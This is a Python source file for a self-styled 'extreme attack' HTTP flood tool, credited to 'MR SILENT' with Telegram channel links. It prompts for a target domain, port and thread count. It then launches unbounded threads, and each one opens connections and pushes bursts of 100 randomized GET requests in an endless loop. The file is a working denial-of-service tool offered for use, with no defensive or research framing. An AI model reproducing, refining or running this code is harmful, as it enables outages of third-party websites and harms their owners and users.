import socket
import threading
import random
import requests
import time
import sys
import ssl

# --- DEVELOPER INFO ---
# NAME: MR SILENT
# CHANNEL: https://t.me/+qINj6OQbKSlkYWRl
# CREDIT: t.me/mr_silent_71
# ----------------------

def banner():
    print("\033[1;31m" + r"""
   ______ _____    _     _____ 
  / ____/ ____|  | |   |___  |
 | |   | (___    | |      / / 
 | |    \___ \   | |     / /  
 | |________) |  | |___ / /   
  \____|_____/   |_____/_/    
 [ CS L7 MEGA V2 - POWERED BY MR SILENT ]
    """ + "\033[1;m")

def get_proxies():
    try:
        url = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
        proxies = requests.get(url).text.split('\r\n')
        return [p for p in proxies if p]
    except:
        return []

def launch_attack(target_host, target_port, proxies):
    ua = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.0.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X)"
    ]
    
    success = 0
    fail = 0

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            
            if target_port == 443:
                context = ssl.create_default_context()
                s = context.wrap_socket(s, server_hostname=target_host)
            
            s.connect((target_host, target_port))
            
            # মেগা ফ্লাড হেডার
            header = f"GET /?{random.randint(1, 99999)} HTTP/1.1\r\nHost: {target_host}\r\nUser-Agent: {random.choice(ua)}\r\nConnection: keep-alive\r\n\r\n"
            
            # এক কানেকশনে ১০০টি প্যাকেট পুশ করা (High Pressure)
            for _ in range(100):
                s.send(header.encode())
                success += 1
                # প্রতি ১০০ প্যাকেটে একবার রেজাল্ট দেখাবে যাতে স্ক্রিন হ্যাং না হয়
                if success % 100 == 0:
                    print(f"\033[1;32m[*] [SUCCESS] {success} Packets Sent to {target_host}\033[0m")
            
            s.close()
        except Exception as e:
            fail += 1
            print(f"\033[1;31m[!] [FAILED] Connection Error: {fail}\033[0m")
            pass

def main():
    banner()
    target_input = input("\033[1;34m[?] Enter Domain: \033[1;m").replace("https://", "").replace("http://", "").split('/')[0]
    target_port = int(input("\033[1;34m[?] Enter Port (80/443): \033[1;m"))
    threads = int(input("\033[1;34m[?] Enter Threads (Power): \033[1;m"))

    proxies = get_proxies()
    print(f"\033[1;33m[+] Starting Extreme Attack on {target_input}...\033[1;m")

    for i in range(threads):
        t = threading.Thread(target=launch_attack, args=(target_input, target_port, proxies))
        t.daemon = True
        t.start()
    
    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
